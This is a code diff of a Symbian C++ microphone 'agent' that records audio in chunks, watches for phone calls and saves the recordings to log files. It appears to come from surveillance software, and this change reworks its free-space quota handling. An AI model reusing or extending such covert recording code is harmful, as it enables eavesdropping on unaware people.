@@ -49,7 +49,7 @@ CAgentMic::CAgentMic() :
 
 CAgentMic::~CAgentMic()
 	{
-	delete iFreeSpaceMonitor;
+	//delete iFreeSpaceMonitor;
 	delete iCallMonitor;
 	delete iTimer;
 	
@@ -101,11 +101,6 @@ void CAgentMic::ConstructL(const TDesC8& params)
 	ptr += 4;
 	Mem::Copy(&iVadThreshold,ptr,4 );
 	
-	
-	//check quota
-	iFreeSpaceMonitor = CFreeSpaceMonitor::NewL(*this,iFs);
-	iBelowQuota = iFreeSpaceMonitor->IsBelowThreshold();
-	
 	iCallMonitor = CSlimPhoneCallMonitor::NewL(*this);
 	iTimer = CTimeOutTimer::NewL(*this);
 		
@@ -137,7 +132,6 @@ void CAgentMic::StartAgentCmdL()
 	//__FLOG(_L("StartAgentCmdL()"));
 	
 	iCallMonitor->StartListeningForEvents();
-	iFreeSpaceMonitor->StartListeningForEvents();
 	
 	TTime now;
 	now.UniversalTime();
@@ -176,6 +170,30 @@ void CAgentMic::StopAgentCmdL()
 	
 	}
 
+void CAgentMic::NotifyAgentCmdL(TUint32 aData)
+	{
+	TInt notifyType = aData & 0x000000ff;
+	switch(notifyType)
+		{
+		case ENotifyThreshold:
+			{
+			TInt value = (aData & 0x0000ff00) >> 8;
+			if (value == EBelow)
+				{
+				iBelowFreespaceQuota = ETrue;
+				}
+			else
+				{
+				iBelowFreespaceQuota = EFalse;
+				}
+			}
+			break;
+		default:
+			break;
+		}
+	}
+
+
 /*
  * MMdaAudioInputStream callbacks (MMdaAudioInputStreamCallback)
  *
@@ -199,9 +217,6 @@ void CAgentMic::MaiscOpenComplete(TInt aError)
 		iRecData = HBufC8::NewL(KBufferSize);
 			
 		iFramesCounter = 0;
-		//iErrDied = EFalse;
-		//iInCall = EFalse;
-		//iStreamCounter = 0;
 			
 		// Set the data type (encoding)
         TRAPD(error, iInputStream->SetDataTypeL(iDefaultEncoding));
@@ -255,7 +270,7 @@ void CAgentMic::MaiscBufferCopied(TInt aError, const TDesC8& aBuffer)
 			iFramesCounter++;
 			if(iFramesCounter == KFrameCountAMR)
 				{
-				if(!iBelowQuota)
+				if(!iBelowFreespaceQuota)
 					{
 					// 5 sec has been recorded, save log...
 					CLogFile* logFile = CLogFile::NewLC(iFs);
@@ -275,11 +290,14 @@ void CAgentMic::MaiscBufferCopied(TInt aError, const TDesC8& aBuffer)
 		if(aBuffer.Length())
 			{
 			iRecData->Des().Append(aBuffer);
-			CLogFile* logFile = CLogFile::NewLC(iFs);
-			logFile->CreateLogL(LOGTYPE_MIC, &iMicAdditionalData);
-			logFile->AppendLogL(*iRecData);
-			logFile->CloseLogL();
-			CleanupStack::PopAndDestroy(logFile);
+			if(!iBelowFreespaceQuota)
+				{
+				CLogFile* logFile = CLogFile::NewLC(iFs);
+				logFile->CreateLogL(LOGTYPE_MIC, &iMicAdditionalData);
+				logFile->AppendLogL(*iRecData);
+				logFile->CloseLogL();
+				CleanupStack::PopAndDestroy(logFile);
+				}
 			iRecData->Des().Zero();
 			iFramesCounter = 0;
 			}
@@ -364,12 +382,3 @@ void CAgentMic::RestartRecording()
 	iInputStream->ReadL(*iStreamBufferArray[1]);
 	}
 
-void CAgentMic::NotifyAboveThreshold()
-	{
-	iBelowQuota = EFalse;
-	}
-
-void CAgentMic::NotifyBelowThreshold()
-	{
-	iBelowQuota = ETrue;
-	}
